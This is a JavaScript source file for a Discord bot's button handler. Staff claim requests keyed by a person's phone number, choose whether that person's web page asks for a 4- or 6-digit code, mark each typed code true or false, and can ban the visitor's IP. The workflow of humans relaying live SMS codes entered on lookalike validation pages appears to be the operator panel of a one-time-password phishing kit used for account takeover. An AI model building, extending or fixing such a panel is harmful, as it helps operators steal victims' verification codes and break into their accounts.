/**
 * buttons.js — Discord button interaction handler  (v2.3)
 *
 * v2.3 — False code flow overhaul:
 *  OLD: falsecode → edit message "refused" → send NEW embed with True/False buttons
 *  NEW: falsecode → edit message IN-PLACE back to [4/6 digits · Wrong · Unclaim]
 *       so staff immediately picks the new code length without a second embed.
 *       User is redirected back to validation.html (waiting for new length) via
 *       verify-wait.js detecting retry_code status.
 *
 * v2.2: claimer-only buttons (in-memory + DB fallback after restart)
 * v2.1: len4/len6 length param, sendRetryEmbed defined, unclaim restores Claim button,
 *        double-claim protection, fetch timeout, unclaim logging.
 */

import {
    ButtonBuilder, ButtonStyle,
    ActionRowBuilder, EmbedBuilder,
} from "discord.js";
import { CONFIG }                            from "../config.js";
import { getRequestByPhone, getClaimedBy }  from "../database.js";
import { getOperatorColor }                  from "../utils/colors.js";
import { formatPhone }                       from "../utils/formatters.js";
import { buildNewRequestEmbed }             from "../utils/embedBuilder.js";
import { callStaffAction, callBanIP }       from "../utils/api.js";

// ─── In-memory claimer Map ────────────────────────────────────────────────────
export const claimedBy = new Map();

// ─── Shared button builders ───────────────────────────────────────────────────

function createBanIPButton(ip) {
    if (!ip || ip === "unknown" || ip === "null" || !ip.includes(".")) return null;
    return new ButtonBuilder()
        .setCustomId("banip_" + ip)
        .setLabel("🚫 Ban IP")
        .setStyle(ButtonStyle.Danger);
}

/** Returns the ActionRow used right after a claim (4/6 · Wrong · Unclaim · BanIP). */
function buildPostClaimRow(phone, ip) {
    const buttons = [
        new ButtonBuilder().setCustomId("len4_"    + phone).setLabel("🔢 4 digits").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId("len6_"    + phone).setLabel("🔢 6 digits").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId("wrong_"   + phone).setLabel("❌ Wrong Number").setStyle(ButtonStyle.Danger),
        new ButtonBuilder().setCustomId("unclaim_" + phone).setLabel("↩️ Unclaim").setStyle(ButtonStyle.Secondary),
    ];
    const banBtn = createBanIPButton(ip);
    if (banBtn) buttons.push(banBtn);
    return new ActionRowBuilder().addComponents(...buttons);
}

/** Edit a message silently (stale interaction tokens don't crash the bot). */
async function safeEditMessage(message, options) {
    try { await message.edit(options); }
    catch (e) { console.warn("⚠️  Could not edit message (stale?):", e.message); }
}

// ─── Claimer-only enforcement ─────────────────────────────────────────────────

/** Returns the claimer userId if the caller is NOT allowed, or null if allowed. */
async function getUnauthorizedClaimer(phone, userId) {
    let claimer = claimedBy.get(phone) ?? null;
    if (!claimer) {
        claimer = await getClaimedBy(phone);
        if (claimer) claimedBy.set(phone, claimer); // restore after restart
    }
    if (!claimer)              return null;  // no lock → allow
    if (claimer === userId)    return null;  // correct person → allow
    return claimer;                          // wrong person → deny
}

async function replyNotYourRequest(interaction, claimer) {
    await interaction.reply({
        content: `🔒 This request was claimed by <@${claimer}>.\nOnly they can interact with these buttons.`,
        flags: 64,
    });
}

// ─── Main handler ─────────────────────────────────────────────────────────────

export async function handleButton(interaction) {
    const [action, ...rest] = interaction.customId.split("_");
    const payload = rest.join("_");

    // ══ OPEN TO ALL STAFF ════════════════════════════════════════════════════

    // ─── CLAIM ────────────────────────────────────────────────────────────────
    if (action === "claim") {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("claim", phone, interaction.user.tag, null, interaction.user.id);
            if (!data.success) {
                await interaction.editReply({ content: "❌ " + (data.message || "Already claimed by someone else.") });
                return;
            }

            claimedBy.set(phone, interaction.user.id);
            await interaction.editReply({ content: `✅ Request **${formatPhone(phone)}** claimed by <@${interaction.user.id}>` });

            const row      = await getRequestByPhone(phone);
            const newEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(getOperatorColor(row?.operator))
                .setTitle("📋 Request In Progress")
                .setDescription(`👤 Claimed by <@${interaction.user.id}>\n⏰ Claimed: <t:${Math.floor(Date.now() / 1000)}:R>\n\n**🔧 Choose an action:**`);

            await safeEditMessage(interaction.message, {
                embeds:     [newEmbed],
                components: [buildPostClaimRow(phone, row?.ip_address)],
            });
        } catch (e) {
            console.error("Claim error:", e);
            await interaction.editReply({ content: "❌ Network error while claiming." });
        }
        return;
    }

    // ─── BAN IP ───────────────────────────────────────────────────────────────
    if (action === "banip") {
        const ip = payload;
        await interaction.deferReply({ flags: 64 });
        if (!ip || ip === "unknown" || ip === "null") {
            await interaction.editReply({ content: "❌ Invalid IP." });
            return;
        }
        try {
            const data = await callBanIP(ip, interaction.user.tag);
            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
            await interaction.editReply({ content: `🚫 IP **${ip}** banned!` });
            const bannedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0xef4444).setTitle("🔨 IP Banned")
                .setDescription(`🚫 **${ip}** banned by <@${interaction.user.id}>\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>`);
            await safeEditMessage(interaction.message, { embeds: [bannedEmbed], components: [] });
        } catch (e) {
            console.error("banip error:", e);
            await interaction.editReply({ content: "❌ Network error while banning." });
        }
        return;
    }

    // ══ CLAIMER-ONLY BUTTONS — check permission first ═════════════════════════
    const phone     = payload;
    const otherUser = await getUnauthorizedClaimer(phone, interaction.user.id);
    if (otherUser) { await replyNotYourRequest(interaction, otherUser); return; }

    // ─── 4 CHIFFRES ───────────────────────────────────────────────────────────
    if (action === "len4") {
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("set_length", phone, interaction.user.tag, 4);
            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
            await interaction.editReply({ content: `✅ **4-digit** code requested for ${formatPhone(phone)}` });
            const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0x10b981).setTitle("⏳ Awaiting Code (4 digits)")
                .setDescription(`👤 Claimed\n🔢 Requested code: **4 digits**\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>\n\n*Waiting for the user to enter it…*`);
            await safeEditMessage(interaction.message, { embeds: [doneEmbed], components: [] });
        } catch (e) { console.error("len4 error:", e); await interaction.editReply({ content: "❌ Error." }); }
        return;
    }

    // ─── 6 CHIFFRES ───────────────────────────────────────────────────────────
    if (action === "len6") {
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("set_length", phone, interaction.user.tag, 6);
            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
            await interaction.editReply({ content: `✅ **6-digit** code requested for ${formatPhone(phone)}` });
            const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0x10b981).setTitle("⏳ Awaiting Code (6 digits)")
                .setDescription(`👤 Claimed\n🔢 Requested code: **6 digits**\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>\n\n*Waiting for the user to enter it…*`);
            await safeEditMessage(interaction.message, { embeds: [doneEmbed], components: [] });
        } catch (e) { console.error("len6 error:", e); await interaction.editReply({ content: "❌ Error." }); }
        return;
    }

    // ─── MAUVAIS NUMÉRO ───────────────────────────────────────────────────────
    if (action === "wrong") {
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("wrong_number", phone, interaction.user.tag);
            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
            await interaction.editReply({ content: `✅ Wrong number reported for ${formatPhone(phone)}` });
            claimedBy.delete(phone);
            const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0xef4444).setTitle("❌ Wrong Number")
                .setDescription(`❌ The user is being redirected to re-enter their number.\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>`);
            await safeEditMessage(interaction.message, { embeds: [doneEmbed], components: [] });
        } catch (e) { console.error("wrong error:", e); await interaction.editReply({ content: "❌ Error." }); }
        return;
    }

    // ─── UNCLAIM ──────────────────────────────────────────────────────────────
    if (action === "unclaim") {
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("unclaim", phone, interaction.user.tag);
            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
            claimedBy.delete(phone);
            await interaction.editReply({ content: `↩️ Request **${formatPhone(phone)}** unclaimed. Back in the queue.` });

            const row    = await getRequestByPhone(phone);
            const reclaimBtn = new ButtonBuilder()
                .setCustomId("claim_" + phone).setLabel("📋 Claim").setStyle(ButtonStyle.Primary);
            const banBtn = createBanIPButton(row?.ip_address);
            const btns   = banBtn ? [reclaimBtn, banBtn] : [reclaimBtn];

            const unclaimedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0x6b7280).setTitle("📭 Request Unclaimed")
                .setDescription(`↩️ Unclaimed by <@${interaction.user.id}>\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>\nBack in the waiting queue.`);
            await safeEditMessage(interaction.message, {
                embeds:     [unclaimedEmbed],
                components: [new ActionRowBuilder().addComponents(...btns)],
            });
        } catch (e) { console.error("unclaim error:", e); await interaction.editReply({ content: "❌ Error." }); }
        return;
    }

    // ─── TRUE CODE ────────────────────────────────────────────────────────────
    if (action === "truecode") {
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("true_code", phone, interaction.user.tag);
            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
            await interaction.editReply({ content: `✅ Code validated for ${formatPhone(phone)} 🎉` });
            claimedBy.delete(phone);
            const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0x10b981).setTitle("✅ Code Validated!")
                .setDescription(`👤 Validated by <@${interaction.user.id}>\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>\nThe user is being redirected to the success page.`);
            await safeEditMessage(interaction.message, { embeds: [doneEmbed], components: [] });
        } catch (e) { console.error("truecode error:", e); await interaction.editReply({ content: "❌ Error." }); }
        return;
    }

    // ─── FALSE CODE ───────────────────────────────────────────────────────────
    // v2.3 FIX: instead of clearing the embed + sending a NEW retry embed,
    //           we edit the current message IN-PLACE back to the post-claim buttons
    //           (4/6 digits · Wrong · Unclaim · Ban IP).
    //
    // User side: verify-wait.js detects retry_code → redirects to validation.html?retry=1
    //            validation.js waits for waiting_code → redirects to code.html with correct length
    if (action === "falsecode") {
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("false_code", phone, interaction.user.tag);
            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }

            await interaction.editReply({
                content: `🔄 Code rejected for ${formatPhone(phone)}.\nChoose a new length — the user will re-enter their code.`,
            });

            const row = await getRequestByPhone(phone);

            // Edit this embed back to the "choose length" state so staff can pick 4 or 6 again
            const retryEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0xf59e0b)
                .setTitle("🔄 Code Rejected — New Length?")
                .setDescription(
                    `👤 Claimed by <@${interaction.user.id}>\n` +
                    `⏰ <t:${Math.floor(Date.now() / 1000)}:R>\n` +
                    `⚠️ The previous code was **incorrect**.\n` +
                    `The user is waiting on the validation page.\n\n` +
                    `**Choose the length of the next code:**`
                );

            await safeEditMessage(interaction.message, {
                embeds:     [retryEmbed],
                components: [buildPostClaimRow(phone, row?.ip_address)],
            });
        } catch (e) { console.error("falsecode error:", e); await interaction.editReply({ content: "❌ Error." }); }
        return;
    }

    console.warn("⚠️  Unknown button action:", action, "payload:", payload);
}
